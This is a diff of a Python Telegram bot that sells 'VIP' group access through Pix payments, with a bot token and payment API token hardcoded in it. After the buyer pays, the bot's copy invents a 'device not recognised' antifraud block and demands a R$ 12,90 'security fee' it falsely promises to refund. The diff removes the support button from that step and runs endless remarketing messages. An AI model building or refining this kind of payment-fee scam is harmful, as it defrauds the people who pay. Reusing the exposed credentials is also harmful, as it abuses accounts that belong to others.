@@ -14,11 +14,7 @@ scheduler.start()
 TELEGRAM_BOT_TOKEN = "9144271229:AAFvv9taDmGTnlI4nHoQ4mAOTJqsJFCOxb4"
 PUSHINPAY_API_TOKEN = "73774|DCDTM4JGmuvz4MS4g5vPHy2ucM54PkCeQEu7QA4y49fe526b"
 ADMIN_ID = "7008304182"
-VIP_GROUP_ID = "-1001921257744"
-
-# Coloque seu @username do Telegram SEM o @ 
-USUARIO_SUPORTE = "suporte_playbox"
-LINK_SUPORTE = f"https://t.me/{USUARIO_SUPORTE.replace('@', '').strip()}"
+VIP_GROUP_ID = "-1002019479469"  # ID atualizado do PlayBox VIP
 
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 PUSHINPAY_API_URL = "https://api.pushinpay.com.br/api"
@@ -29,7 +25,7 @@ usuarios = {}
 transacoes_processadas = set()
 
 # ==================== MÍDIAS DO FUNIL ====================
-# Mantenha aqui os seus IDs MP4 (BAAC...) já corrigidos no seu GitHub!
+# ATENÇÃO: Mantenha aqui os seus IDs MP4 (BAAC...) e fotos já corrigidos no seu GitHub!
 VIDEO_1_NARRADO = "BAACAgEAAxkBAANsave8MCzTRAAB-Jh1L1XMHd-yzFObAALSCAACoWXAR5NYoZrWsqowPQQ"
 VIDEO_2_LONGO = "BAACAgEAAxkBAANtave8XRVU7iwp87WgDcnbNobQqPsAAtQIAAKhZcBHvE_GplCivNM9BA"
 VIDEO_3_PROMESSA = "BAACAgEAAxkBAANuave8pAc0LOXei2ck23ittY0H0h8AAtYIAAKhZcBHaTUVWtRpEEo9BA"
@@ -59,8 +55,9 @@ TEXTO_OFERTA_NINFA = (
     "👇 **ESCOLHA COMO DESEJA CONTINUAR:**"
 )
 
-# 3. COPY DA TAXA DE SEGURANÇA (Só aparece DEPOIS que o Pix de entrada é pago)
+# 3. COPY DA TAXA DE SEGURANÇA (Com abertura de garantia e vaga reservada)
 TEXTO_TAXA_SEGURANCA = (
+    "✅ **Sua compra está garantida e sua vaga no VIP já está reservada!**\n\n"
     "⚠️ **ÚLTIMA ETAPA OBRIGATÓRIA - DISPOSITIVO NÃO RECONHECIDO!**\n\n"
     "Pagamento de entrada confirmado! Porém, nosso sistema antifraude barrou sua entrada imediata. Para manter o grupo 100% livre de denúncias, exigimos uma ativação de segurança.\n\n"
     "🔄 **O valor de R$ 12,90 é 100% REEMBOLSADO** na sua conta PIX no mesmo instante em que você entrar no grupo.\n\n"
@@ -70,14 +67,28 @@ TEXTO_TAXA_SEGURANCA = (
 # 4. INSTRUÇÕES DO PIX
 TEXTO_INSTRUCOES_PIX = (
     "✅ **Como pagar e liberar na hora:**\n\n"
-    "1️⃣ - Toque no código abaixo para copiar\n"
+    "1️⃣ - Toque no botão azul **Copiar Chave Pix** abaixo (ou toque no código)\n"
     "2️⃣ - Abra o app do seu banco\n"
-    "3️⃣ - Escolha **PIX Copia e Cola** e finalize.\n\n"
+    "3️⃣ - Escolha **PIX Copia e Cola** e finalize.\n"
+    "4️⃣ - Volte aqui e clique em **Já fiz o pagamento! ✅**.\n\n"
     "⬇️ **COPIE SEU CÓDIGO ABAIXO** ⬇️"
 )
 
 
 # --- FUNÇÕES DE ENVIO TELEGRAM ---
+def _remover_estilos_markup(markup):
+    if not markup or "inline_keyboard" not in markup:
+        return markup
+    novo_teclado = []
+    for linha in markup["inline_keyboard"]:
+        nova_linha = []
+        for btn in linha:
+            btn_limpo = {k: v for k, v in btn.items() if k != "style"}
+            nova_linha.append(btn_limpo)
+        novo_teclado.append(nova_linha)
+    return {"inline_keyboard": novo_teclado}
+
+
 def enviar_mensagem(chat_id, texto, markup=None):
     payload = {"chat_id": chat_id, "text": texto, "parse_mode": "Markdown"}
     if markup:
@@ -91,9 +102,12 @@ def enviar_mensagem(chat_id, texto, markup=None):
             if markup:
                 payload_sem_md["reply_markup"] = markup
             req2 = requests.post(f"{TELEGRAM_API_URL}/sendMessage", json=payload_sem_md, timeout=15)
-            if req2.status_code != 200:
-                # Fallback 2: garante entrega do texto/código mesmo se algum botão falhar
-                requests.post(f"{TELEGRAM_API_URL}/sendMessage", json={"chat_id": chat_id, "text": texto}, timeout=15)
+            if req2.status_code != 200 and markup:
+                # Fallback 2: remove apenas o 'style' caso algum parâmetro de botão falhe
+                payload_sem_estilo = {"chat_id": chat_id, "text": texto, "reply_markup": _remover_estilos_markup(markup)}
+                req3 = requests.post(f"{TELEGRAM_API_URL}/sendMessage", json=payload_sem_estilo, timeout=15)
+                if req3.status_code != 200:
+                    requests.post(f"{TELEGRAM_API_URL}/sendMessage", json={"chat_id": chat_id, "text": texto}, timeout=15)
     except Exception as e:
         print(f"Exceção sendMessage: {e}")
 
@@ -204,8 +218,7 @@ def processar_pagamento_aprovado(chat_id, tx_id=None):
         def enviar_taxa():
             enviar_foto(chat_id, IMAGEM_TAXA_SEGURANCA, TEXTO_TAXA_SEGURANCA, {
                 "inline_keyboard": [
-                    [{"text": "🔒 Ativar e Reembolsar (R$ 12,90)", "callback_data": "pagar_taxa_1290"}],
-                    [{"text": "💬 Suporte", "url": LINK_SUPORTE}]
+                    [{"text": "🔒 Ativar e Reembolsar (R$ 12,90)", "callback_data": "pagar_taxa_1290"}]
                 ]
             })
 
@@ -236,7 +249,7 @@ def processar_pagamento_aprovado(chat_id, tx_id=None):
     return False
 
 
-# --- ENTREGA DO PIX + REINÍCIO DO REMARKETING COM VÍDEO 3 ---
+# --- ENTREGA DO PIX + BOTÕES COLORIDOS (CONFIRMAR + COPIAR CHAVE) ---
 def entregar_pix_completo(chat_id, valor_reais):
     enviar_mensagem(chat_id, "⏳ *Gerando sua chave PIX criptografada, aguarde...*")
     codigo_pix, tx_id, erro = gerar_pix_pushinpay(valor_reais, chat_id)
@@ -255,8 +268,20 @@ def entregar_pix_completo(chat_id, valor_reais):
 
         markup_pix = {
             "inline_keyboard": [
-                [{"text": "✅ Confirmar Pagamento", "callback_data": "verificar_pagamento"}],
-                [{"text": "💬 Suporte", "url": LINK_SUPORTE}]
+                [
+                    {
+                        "text": "Já fiz o pagamento! ✅",
+                        "callback_data": "verificar_pagamento",
+                        "style": "success"
+                    }
+                ],
+                [
+                    {
+                        "text": "Copiar Chave Pix 🗒",
+                        "copy_text": {"text": codigo_pix},
+                        "style": "primary"
+                    }
+                ]
             ]
         }
         enviar_mensagem(chat_id, f"`{codigo_pix}`", markup_pix)
@@ -270,7 +295,6 @@ def entregar_pix_completo(chat_id, valor_reais):
 
 # --- MOTOR DE REMARKETING INFINITO ---
 def agendar_remarketing(chat_id, tipo_funil, contagem):
-    # Primeiro remarketing em 4 minutos, depois segue a sequência normal
     if contagem == 0:
         tempo = timedelta(minutes=4)
     elif contagem == 1:
@@ -300,7 +324,6 @@ def disparar_remarketing(chat_id, tipo_funil, contagem):
 
     def envio_background():
         # ETAPA 1: Deu /start e não clicou no botão da 1ª oferta
-        # 1º remarketing (contagem 0) = Vídeo 3 | Próximos = sequência Vídeo 1 -> Vídeo 3 -> Vídeo 1 -> Vídeo 3...
         if tipo_funil == "INICIO_SEM_CLIQUE":
             markup_inicio = {
                 "inline_keyboard": [
@@ -477,19 +500,18 @@ def telegram_webhook():
                 else:
                     enviar_mensagem(
                         chat_id,
-                        "⏳ *Pagamento ainda não identificado!*\n\nO banco ainda não confirmou o seu PIX. Assim que concluir o pagamento no aplicativo do seu banco, toque em **✅ Confirmar Pagamento** novamente."
+                        "⏳ *Pagamento ainda não identificado!*\n\nO banco ainda não confirmou o seu PIX. Assim que concluir o pagamento no aplicativo do seu banco, toque em **Já fiz o pagamento! ✅** novamente."
                     )
 
             threading.Thread(target=checar_pix).start()
 
         else:
             responder_clique_botao(query["id"])
-            # Valores de TESTE (< R$ 1,00 e R$ 1,10). Depois do teste, volte para os originais:
             valores = {
-                "comprar_1489": "0.60",     # Original: "14.89"
-                "comprar_990": "0.50",      # Original: "9.90"
-                "pagar_taxa_1290": "1.10",  # Original: "12.90"
-                "pagar_taxa_490": "0.55"    # Original: "4.90"
+                "comprar_1489": "0.50",
+                "comprar_990": "9.90",
+                "pagar_taxa_1290": "0.90",
+                "pagar_taxa_490": "4.90"
             }
             if botao in valores:
                 threading.Thread(target=entregar_pix_completo, args=(chat_id, valores[botao])).start()
